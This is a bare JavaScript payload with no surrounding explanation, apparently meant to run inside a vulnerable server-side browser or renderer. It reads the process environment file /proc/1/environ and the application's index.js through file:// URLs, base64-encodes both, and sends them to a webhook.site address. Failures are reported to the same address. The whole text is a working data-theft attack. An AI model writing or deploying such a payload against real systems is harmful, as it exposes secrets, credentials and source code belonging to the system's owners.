var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
fetch('file:///proc/1/environ').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/ENV?d='+btoa(t));
}).catch(function(e){fetch(w+'/ENV_ERR?d='+encodeURIComponent(e+''))});

fetch('file:///index.js').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/IDX?d='+btoa(t));
}).catch(function(e){fetch(w+'/IDX_ERR?d='+encodeURIComponent(e+''))});
